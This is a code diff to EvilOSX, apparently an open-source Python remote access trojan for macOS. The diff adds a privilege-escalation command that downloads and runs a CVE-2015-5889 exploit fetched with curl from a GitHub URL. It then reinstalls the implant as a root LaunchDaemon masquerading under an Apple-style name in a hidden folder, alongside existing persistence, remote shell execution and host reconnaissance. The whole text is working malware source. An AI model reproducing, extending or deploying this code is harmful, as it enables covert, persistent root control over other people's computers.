@@ -16,14 +16,83 @@ MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"
 development = True
 
 
-def kill_client():
-    launch_agent_name = "com.apple.EvilOSX"
-    launch_agent_file = os.path.expanduser("~/Library/LaunchAgents/{0}.plist".format(launch_agent_name))
+def get_root(server_socket):
+    if is_root():
+        server_socket.sendall(MESSAGE_ATTENTION + "We are already root!")
+    else:
+        system_version = str(platform.mac_ver()[0])
 
-    os.system("rm -f {0}".format(launch_agent_file))
-    os.system("rm -rf {0}/".format(program_folder))
-    os.system("launchctl remove {0}".format(launch_agent_name))
-    exit()
+        if system_version.startswith("10.9") or system_version.startswith("10.10"):
+            # Attempt to get root via CVE-2015-5889
+            payload_url = "https://raw.githubusercontent.com/Marten4n6/EvilOSX/master/Payloads/LPE_10-10-5.py"
+            payload_file = "/tmp/LPE_10-10-5.py"
+
+            execute_command("curl {0} -s -o {1}".format(payload_url, payload_file))  # Download exploit
+
+            if "Exploit completed." in execute_command("python {0}".format(payload_file), False):
+                # We can now run commands as sudo, move EvilOSX to a root location.
+                server_socket.sendall(MESSAGE_INFO + "Exploit completed successfully, reconnecting as root.")
+
+                execute_command("rm -rf {0}".format(payload_file))
+                execute_command("sudo mkdir -p {0}".format(get_program_folder(True)))
+                execute_command("sudo mkdir -p /Library/LaunchDaemons")
+
+                # Move program file and launch agent to new location.
+                execute_command("sudo cp {0} {1}".format(get_launch_agent_file(), get_launch_agent_file(True)))
+                execute_command("sudo cp {0} {1}".format(get_program_file(), get_program_file(True)))
+
+                # Point the launch agent to the new EvilOSX file location.
+                command = "sudo sed -i '' -e \"s|{0}|{1}|g\" {2}".format(get_program_file(), get_program_file(True), get_launch_agent_file(True))
+                execute_command(command)
+
+                execute_command("sudo launchctl load -w {0}".format(get_launch_agent_file(True)))
+                kill_client()
+            else:
+                server_socket.sendall(MESSAGE_ATTENTION + "Unknown error while running exploit.")
+        else:
+            server_socket.sendall(MESSAGE_ATTENTION + "LPE not implemented for this version of OS X ({0}).\n".format(system_version))
+
+
+def kill_client(root=False):
+    if root:
+        execute_command("sudo rm -rf {0}".format(get_launch_agent_file(True)))
+        execute_command("sudo rm -rf {0}/".format(get_program_folder(True)))
+        execute_command("sudo launchctl remove {0}".format(get_launch_agent_name()))
+        exit()
+    else:
+        execute_command("rm -rf {0}".format(get_launch_agent_file()))
+        execute_command("rm -rf {0}/".format(get_program_folder()))
+        execute_command("launchctl remove {0}".format(get_launch_agent_name()))
+        exit()
+
+
+def is_root():
+    if os.getuid() == 0:
+        return True
+    else:
+        return False
+
+
+def get_program_file(root=False):
+    return get_program_folder(root) + "/EvilOSX"
+
+
+def get_program_folder(root=False):
+    if root:
+        return "/Library/Containers/.EvilOSX"
+    else:
+        return os.path.expanduser("~/Library/Containers/.EvilOSX")
+
+
+def get_launch_agent_file(root=False):
+    if root:
+        return "/Library/LaunchDaemons/{0}.plist".format(get_launch_agent_name())
+    else:
+        return os.path.expanduser("~/Library/LaunchAgents/{0}.plist".format(get_launch_agent_name()))
+
+
+def get_launch_agent_name():
+    return "com.apple.EvilOSX"
 
 
 def get_wifi():
@@ -63,15 +132,10 @@ def execute_command(command, cleanup=True):
         return output
 
 
-def setup_persistence(program_folder):
-    launch_agent_name = "com.apple.EvilOSX"
-    launch_agent_file = os.path.expanduser("~/Library/LaunchAgents/{0}.plist".format(launch_agent_name))
-
-    program_file = program_folder + "/EvilOSX"
-
+def setup_persistence():
     # Create directories
     execute_command("mkdir -p ~/Library/LaunchAgents/")
-    execute_command("mkdir -p {0}".format(program_folder))
+    execute_command("mkdir -p {0}".format(get_program_folder()))
 
     # Create launch agent
     print MESSAGE_INFO + "Creating launch agent..."
@@ -90,9 +154,9 @@ def setup_persistence(program_folder):
           <integer>5</integer>
        </dict>
     </plist>
-    '''.format(launch_agent_name, program_file)
+    '''.format(get_launch_agent_name(), get_program_file())
 
-    with open(launch_agent_file, 'wb') as content:
+    with open(get_launch_agent_file(), 'wb') as content:
         content.write(launch_agent_create)
 
     # Move EvilOSX
@@ -100,18 +164,18 @@ def setup_persistence(program_folder):
 
     if development:
         with open(__file__, 'rb') as content:
-            with open(program_file, 'wb') as binary:
+            with open(get_program_file(), 'wb') as binary:
                 binary.write(content.read())
     else:
-        os.rename(__file__, program_file)
-    os.chmod(program_file, 0777)
+        os.rename(__file__, get_program_file())
+    os.chmod(get_program_file(), 0777)
 
     # Load launch agent
     print MESSAGE_INFO + "Loading launch agent..."
-    out = subprocess.Popen("launchctl load -w {0}".format(launch_agent_file), shell=True, stderr=subprocess.PIPE).stderr.read()
+    out = subprocess.Popen("launchctl load -w {0}".format(get_launch_agent_file()), shell=True, stderr=subprocess.PIPE).stderr.read()
 
     if out == '':
-        if execute_command("launchctl list | grep -w {0}".format(launch_agent_name)):
+        if execute_command("launchctl list | grep -w {0}".format(get_launch_agent_name())):
             print MESSAGE_INFO + "Done!"
             exit()
         else:
@@ -127,7 +191,11 @@ def setup_persistence(program_folder):
 
 def start_server():
     print MESSAGE_INFO + "Starting EvilOSX..."
-    os.chdir(os.path.expanduser("~"))
+
+    if is_root():
+        os.chdir("/")
+    else:
+        os.chdir(os.path.expanduser("~"))
 
     while True:
         # Connect to server.
@@ -176,6 +244,10 @@ def start_server():
                 response += MESSAGE_INFO + "Battery: " + battery[0] + battery[1] + ".\n"
                 response += MESSAGE_INFO + "WiFi network: " + get_wifi() + " (" + get_external_ip() + ")\n"
                 response += MESSAGE_INFO + "Shell location: " + __file__ + "\n"
+                if is_root():
+                    response += MESSAGE_INFO + "We are root!\n"
+                else:
+                    response += MESSAGE_ATTENTION + "We are not root, see \"get_root\" for local privilege escalation.\n"
                 if "On" in filevault:
                     response += MESSAGE_ATTENTION + "FileVault is on.\n"
                 else:
@@ -184,7 +256,13 @@ def start_server():
                 server_socket.sendall(response)
             elif command == "kill_client":
                 server_socket.sendall("Farewell.")
-                kill_client()
+
+                if is_root():
+                    kill_client(True)
+                else:
+                    kill_client()
+            elif command == "get_root":
+                get_root(server_socket)
             else:
                 # Regular shell command
                 if len(command) > 3 and command[0:3] == "cd ":
@@ -213,11 +291,8 @@ def start_server():
         server_socket.close()
 
 
-current_folder = os.path.dirname(os.path.realpath(__file__))
-program_folder = os.path.expanduser("~/Library/Containers/.EvilOSX")
-
-if current_folder.lower() != program_folder.lower():
-    setup_persistence(program_folder)
+if os.path.dirname(os.path.realpath(__file__)).lower() != get_program_folder().lower() and not is_root():
+    setup_persistence()
 
 #########################
 SERVER_HOST = "127.0.0.1"
